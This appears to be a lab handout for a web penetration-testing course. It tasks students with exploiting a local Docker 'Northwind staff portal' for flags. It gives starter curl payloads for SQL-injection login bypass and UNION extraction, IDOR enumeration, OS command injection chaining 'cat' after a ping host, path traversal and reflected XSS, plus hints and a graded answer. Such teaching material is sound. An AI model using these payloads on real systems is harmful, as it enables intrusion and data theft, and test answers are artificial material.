# Lab 06: Web Application Hacking — OWASP Top 10

**Roadmap:** Phase 3 (OWASP Top 10, web security, Burp/manual exploitation) · **Time:** 4–6 hours · **Points:** 12

## Scenario
Northwind's staff portal is live at `http://10.10.60.20` (mapped to **http://localhost:8081** on your PC). You're doing
an authorized web application penetration test. Find and exploit the vulnerabilities, and recover the flag each one
protects. This is the offensive side of the web intrusion you investigated in Lab 05.

> Don't read `web/app.py` — it's the source of the app you're testing. Attack it over HTTP like a real target.

## Read first (about 2 h)
1. OWASP Top 10 (2021) overview: https://owasp.org/www-project-top-ten/
2. SQL injection (and UNION-based): https://portswigger.net/web-security/sql-injection
3. Broken Access Control / IDOR: https://portswigger.net/web-security/access-control/idor
4. OS command injection: https://portswigger.net/web-security/os-command-injection
5. Path traversal: https://portswigger.net/web-security/file-path-traversal
6. **Do the free PortSwigger labs** for each of the above — this lab assumes you've tried their apprentice labs.

## Start the lab
```powershell
cd "C:\Users\S I N O\Downloads\ciber security labs\labs\lab06-web-owasp"
docker compose up -d --build
```
Then either:
- **Browser:** open http://localhost:8081 (use it with Burp Suite if you have it set up), or
- **Attack box:** `docker exec -it lab06-attacker bash` — you have `curl`, `sqlmap`, `python3`, `nmap`.
  From there the target is `http://10.10.60.20`.

Explore the site first: home, search, login, my account, network tools, downloads.

---

## Tasks (12 pts)
Each flag looks like `FLAG{...}`. Recover and submit each one.

| # | Vulnerability | Where | OWASP | Pts |
|---|---------------|-------|-------|-----|
| 1 | **SQL injection — auth bypass.** Log in as `admin` without the password; the admin dashboard shows a flag. | `/login` | A03 | 2 |
| 2 | **SQL injection — UNION.** The product search builds SQL from your input. Use a UNION to read the hidden `secrets` table. | `/search?q=` | A03 | 3 |
| 3 | **Broken access control (IDOR).** `/account?id=` has no authorization check. Read another user's private note. | `/account?id=` | A01 | 2 |
| 4 | **OS command injection.** The ping tool passes your input to a shell. Run your own command and read `/srv/flags/cmdinj.txt`. | `/tools/ping?host=` | A03 | 3 |
| 5 | **Path traversal.** The download feature builds a file path from your input. Escape the folder and read `/srv/flags/lfi.txt`. | `/download?file=` | A05 | 1 |
| 6 | **Knowledge.** Which OWASP Top 10 **2021** category ID covers Injection (SQLi, command injection)? | — | — | 1 |

### Starter commands (try manually first, then sqlmap for task 2 if you like)
```bash
# Task 1 - auth bypass (think: make the WHERE always true, comment out the rest)
curl -s http://10.10.60.20/login -d "username=admin' -- -&password=x" | grep -i flag

# Task 2 - the search is injectable; find the column count, then UNION to secrets(flag)
curl -s "http://10.10.60.20/search?q=zzz%25'+UNION+SELECT+flag,NULL+FROM+secrets--+-" | grep -i flag

# Task 3 - walk the account ids
for i in 1 2 3 4 5; do echo "id=$i"; curl -s "http://10.10.60.20/account?id=$i" | grep -i 'note\|flag'; done

# Task 4 - chain a command after the ping
curl -s "http://10.10.60.20/tools/ping?host=127.0.0.1;cat+/srv/flags/cmdinj.txt" | grep -i flag

# Task 5 - climb out of /srv/files to /srv/flags
curl -s "http://10.10.60.20/download?file=../flags/lfi.txt"
```
> URL-encode special characters when needed: space=`%20` or `+`, `'`=`%27`, `;`=`%3B`. The hints above are deliberately
> partial — work out the exact payloads yourself; that's the skill.

### Hints
<details><summary>Task 1</summary>The query is <code>... WHERE username='X' AND password='Y'</code>. If you make the username field close the quote and comment out the password check, the password never matters. Classic: <code>admin' -- </code> (note the trailing space after --).</details>
<details><summary>Task 2</summary>Error messages are shown — use them. First match the number of columns the SELECT returns (the search shows two: name, price), then <code>UNION SELECT flag, NULL FROM secrets</code>. You must first break out of the <code>LIKE '%...%'</code> string.</details>
<details><summary>Task 4</summary>Shell metacharacters chain commands: <code>;</code>, <code>&&</code>, <code>|</code>, <code>$(...)</code>. e.g. <code>127.0.0.1; cat /srv/flags/cmdinj.txt</code>.</details>

**Bonus (not graded):** the search page also reflects your input unescaped — a reflected **XSS** (A03). Prove it with
`/search?q=<script>alert(1)</script>` in the browser and note it in your report.

---

## Submitting
In chat: `lab 6 task 1: FLAG{...}`, `lab 6 task 6: A03`, etc.

## Write it up
In `lab06-web-owasp/report.md`, write a **pentest report**: one section per finding with severity, the exact request/
payload (proof of concept), impact, and the remediation (parameterized queries, access-control checks, input
validation / avoiding shell calls, safe file handling). Map each to its OWASP category. This is the deliverable a web
pentester produces.

## Reset (new flags)
```powershell
docker compose down -v; docker compose up -d --build
```
